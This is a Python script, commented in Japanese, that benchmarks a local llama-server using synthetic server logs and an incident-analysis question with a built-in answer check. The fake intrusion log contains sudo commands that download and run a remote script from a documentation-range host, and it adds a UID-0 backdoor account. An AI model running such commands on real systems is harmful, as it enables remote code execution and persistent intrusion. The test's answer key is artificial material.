#!/usr/bin/env python3
"""
§9-11 入力処理速度（prompt tok/s）測定スクリプト

llama-server（ヘッド, 127.0.0.1:8080）に、架空のサーバーログを含む長いプロンプトを
プロンプトキャッシュ無効（cache_prompt=false）で投げ、入力サイズ別に
  - 入力処理速度  timings.prompt_per_second
  - 生成速度      timings.predicted_per_second
を測る。標準ライブラリのみ使用（追加インストール不要）。

使い方（ヘッドの Ubuntu 機で）:
  python3 prompt_speed.py --dry-run            # トークン数の確認だけ
  python3 prompt_speed.py --label qwen3-32b    # 本測定（結果は CSV に追記）

ログの中身はすべて架空。IP は文書用の予約アドレス（RFC 5737）と社内想定の 10.20.0.0/16。
"""
import argparse
import csv
import datetime as dt
import json
import os
import random
import statistics
import sys
import time
import urllib.error
import urllib.request

# ---------------------------------------------------------------- プロンプト
SYSTEM_PROMPT = (
    "あなたは情報セキュリティのインシデント対応を支援するアナリストです。"
    "与えられたログだけを根拠に、日本語で簡潔に回答してください。"
    "ログに書かれていないことを推測で補わないでください。"
)

QUESTION = (
    "上記は Linux サーバー web01 のログです。このログを分析し、次の4点を"
    "日本語の箇条書き（各1行、計4行）で答えてください。\n"
    "(1) 侵害の有無\n(2) 攻撃元の IP アドレス\n(3) 侵入に成功した時刻\n(4) 侵入後の不審な操作"
)

ATTACKER_IP = "203.0.113.45"   # 正解チェック用（回答にこの IP が含まれるか）

# ---------------------------------------------------------------- 架空ログ生成
USERS = ["tanaka", "suzuki", "sato", "deploy"]
PATHS = ["/", "/index.html", "/login", "/api/v1/status", "/static/app.js", "/static/style.css", "/news/2026/10"]
SERVICES = ["logrotate.service", "apt-daily.service", "man-db.service", "fstrim.service"]
BADUSERS = ["admin", "test", "oracle", "ubuntu", "pi", "guest"]


def normal_line(rng: random.Random) -> str:
    """平常時のログ1行（タイムスタンプ抜き）"""
    pid = rng.randint(1000, 65000)
    port = rng.randint(40000, 65000)
    k = rng.random()
    if k < 0.30:
        return f'web01 nginx: 10.20.{rng.randint(1, 9)}.{rng.randint(2, 250)} - - "GET {rng.choice(PATHS)} HTTP/1.1" {rng.choice([200, 200, 200, 304, 404])} {rng.randint(200, 48000)} "-" "Mozilla/5.0"'
    if k < 0.45:
        u = rng.choice(USERS)
        return f"web01 sshd[{pid}]: Accepted publickey for {u} from 10.20.{rng.randint(1, 9)}.{rng.randint(2, 250)} port {port} ssh2"
    if k < 0.55:
        u = rng.choice(USERS)
        return f"web01 sshd[{pid}]: pam_unix(sshd:session): session opened for user {u}(uid={1000 + USERS.index(u)}) by (uid=0)"
    if k < 0.68:
        return f"web01 CRON[{pid}]: (root) CMD (/usr/local/bin/backup.sh >/dev/null 2>&1)"
    if k < 0.78:
        return f"web01 systemd[1]: Started {rng.choice(SERVICES)}."
    if k < 0.90:
        return f"web01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.0.2.{rng.randint(2, 250)} DST=10.20.0.5 PROTO=TCP SPT={port} DPT={rng.choice([23, 445, 3389, 8080])}"
    return f"web01 sshd[{pid}]: Failed password for invalid user {rng.choice(BADUSERS)} from 192.0.2.{rng.randint(2, 250)} port {port} ssh2"


def incident_lines(rng: random.Random) -> list[str]:
    """侵害の一連のログ（総当たり → 侵入成功 → 権限昇格・持続化）"""
    lines = []
    for _ in range(20):
        lines.append(f"web01 sshd[{rng.randint(1000, 65000)}]: Failed password for root from {ATTACKER_IP} port {rng.randint(40000, 65000)} ssh2")
    for _ in range(4):
        lines.append(f"web01 sshd[{rng.randint(1000, 65000)}]: Failed password for backup from {ATTACKER_IP} port {rng.randint(40000, 65000)} ssh2")
    lines += [
        f"web01 sshd[48211]: Accepted password for backup from {ATTACKER_IP} port 51122 ssh2",
        "web01 sshd[48211]: pam_unix(sshd:session): session opened for user backup(uid=1003) by (uid=0)",
        "web01 sudo:   backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/wget -q http://198.51.100.23/upd.sh -O /tmp/.upd.sh",
        "web01 sudo:   backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/bash /tmp/.upd.sh",
        "web01 useradd[48302]: new user: name=sysupd, UID=0, GID=0, home=/root, shell=/bin/bash",
        "web01 crontab[48317]: (root) REPLACE (root)",
        f"web01 sshd[48211]: Disconnected from user backup {ATTACKER_IP} port 51122",
    ]
    return lines


def build_log(n_normal: int, seed: int = 42) -> str:
    """平常ログ n_normal 行の 70% 地点に侵害ログを挟み、時刻を振って返す（seed 固定で毎回同じ文面）"""
    rng = random.Random(seed)
    normal = [normal_line(rng) for _ in range(n_normal)]
    inc = incident_lines(rng)
    pos = int(n_normal * 0.7)
    body = [(l, False) for l in normal[:pos]] + [(l, True) for l in inc] + [(l, False) for l in normal[pos:]]
    t = dt.datetime(2026, 10, 12, 0, 0, 0)
    out = []
    for line, is_inc in body:
        t += dt.timedelta(seconds=rng.randint(1, 3) if is_inc else rng.randint(5, 90))
        out.append(f"{t:%b %d %H:%M:%S} {line}")
    return "\n".join(out)


def build_user_content(n_normal: int) -> str:
    return "```\n" + build_log(n_normal) + "\n```\n\n" + QUESTION


# ---------------------------------------------------------------- HTTP
def post(url: str, payload: dict, timeout: int = 900) -> dict:
    req = urllib.request.Request(url, data=json.dumps(payload).encode("utf-8"),
                                 headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.load(r)
    except urllib.error.HTTPError as e:
        sys.exit(f"HTTP {e.code}: {e.read().decode('utf-8', 'replace')}")


def get(url: str) -> dict:
    with urllib.request.urlopen(url, timeout=30) as r:
        return json.load(r)


def n_ctx_of(base: str) -> int:
    try:
        props = get(base + "/props")
        return int(props.get("default_generation_settings", {}).get("n_ctx") or props.get("n_ctx") or 8192)
    except Exception:
        return 8192


def count_tokens(base: str, text: str) -> int:
    return len(post(base + "/tokenize", {"content": text})["tokens"])


def chat(base: str, user: str, max_tokens: int) -> dict:
    payload = {
        "messages": [{"role": "system", "content": SYSTEM_PROMPT},
                     {"role": "user", "content": user}],
        "temperature": 0,
        "max_tokens": max_tokens,
        "cache_prompt": False,                              # プロンプトキャッシュを使わない
        "chat_template_kwargs": {"enable_thinking": False},  # Qwen3 の思考オフ（他モデルでは無視される）
    }
    t0 = time.perf_counter()
    r = post(base + "/v1/chat/completions", payload)
    r["_wall_s"] = time.perf_counter() - t0
    return r


# ---------------------------------------------------------------- main
def main() -> None:
    ap = argparse.ArgumentParser(description="§9-11 prompt tok/s 測定")
    ap.add_argument("--url", default="http://127.0.0.1:8080")
    ap.add_argument("--label", default="", help="記録用のモデル名（例: qwen3-32b）。省略時は応答の model 欄")
    ap.add_argument("--sizes", default="0,40,90,140", help="平常ログの行数（カンマ区切り）。侵害ログ31行は常に入る")
    ap.add_argument("--runs", type=int, default=3, help="サイズごとの本測定回数（別にウォームアップ1回）")
    ap.add_argument("--max-tokens", type=int, default=256)
    ap.add_argument("--csv", default="prompt_speed_results.csv")
    ap.add_argument("--dump-dir", default="prompts", help="実際に投げたプロンプトの保存先（空文字で保存しない）")
    ap.add_argument("--dry-run", action="store_true", help="トークン数を表示するだけで推論しない")
    a = ap.parse_args()

    base = a.url.rstrip("/")
    n_ctx = n_ctx_of(base)
    limit = n_ctx - a.max_tokens - 200          # システムプロンプト・テンプレート分の余裕
    print(f"server={base}  n_ctx={n_ctx}  入力上限の目安={limit} tokens")

    # サイズ確定（上限を超えるサイズは行数を1割ずつ減らす）
    plan = []
    for s in [int(x) for x in a.sizes.split(",")]:
        n = s
        while True:
            user = build_user_content(n)
            tok = count_tokens(base, SYSTEM_PROMPT + user)
            if tok <= limit or n == 0:
                break
            n = int(n * 0.9)
        if n != s:
            print(f"  ! 平常ログ {s} 行は上限超過のため {n} 行に縮小")
        plan.append((n, tok, user))
        print(f"  平常ログ {n:4d} 行（計 {n + 31:4d} 行） ≒ {tok:5d} tokens")
        if a.dump_dir:
            os.makedirs(a.dump_dir, exist_ok=True)
            with open(os.path.join(a.dump_dir, f"user_{n:04d}lines.txt"), "w", encoding="utf-8") as f:
                f.write(user)
    if a.dry_run:
        return

    # ウォームアップ（最小サイズで1回、結果は捨てる）
    print("warm-up ...")
    chat(base, plan[0][2], 16)

    rows = []
    for n, tok, user in plan:
        pps, gps, walls = [], [], []
        for i in range(a.runs):
            r = chat(base, user, a.max_tokens)
            t = r["timings"]
            if t.get("cache_n", 0) > 0:
                print(f"  ! cache_n={t['cache_n']}：キャッシュが効いています（cache_prompt=false が無視された可能性）")
            content = r["choices"][0]["message"].get("content") or ""
            pps.append(t["prompt_per_second"])
            gps.append(t["predicted_per_second"])
            walls.append(r["_wall_s"])
            row = {
                "datetime": dt.datetime.now().isoformat(timespec="seconds"),
                "label": a.label or r.get("model", ""),
                "model": r.get("model", ""),
                "build": r.get("system_fingerprint", ""),
                "normal_lines": n,
                "run": i + 1,
                "prompt_n": t["prompt_n"],
                "cache_n": t.get("cache_n", 0),
                "prompt_ms": round(t["prompt_ms"], 1),
                "prompt_tps": round(t["prompt_per_second"], 2),
                "predicted_n": t["predicted_n"],
                "predicted_tps": round(t["predicted_per_second"], 2),
                "wall_s": round(r["_wall_s"], 2),
                "finish_reason": r["choices"][0].get("finish_reason"),
                "attacker_ip_found": ATTACKER_IP in content,
            }
            rows.append(row)
            print(f"  lines={n:4d} run{i + 1}: prompt_n={t['prompt_n']:5d}  prompt {t['prompt_per_second']:7.1f} tok/s  "
                  f"gen {t['predicted_per_second']:5.1f} tok/s  wall {r['_wall_s']:5.1f}s  ip_found={row['attacker_ip_found']}")
        print(f"  → median: prompt {statistics.median(pps):7.1f} tok/s / gen {statistics.median(gps):5.1f} tok/s / wall {statistics.median(walls):5.1f}s")
        print("  回答例: " + content.replace("\n", " / ")[:200])

    new = not os.path.exists(a.csv)
    with open(a.csv, "a", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        if new:
            w.writeheader()
        w.writerows(rows)
    print(f"saved: {a.csv}（{len(rows)} 行追記）")


if __name__ == "__main__":
    main()
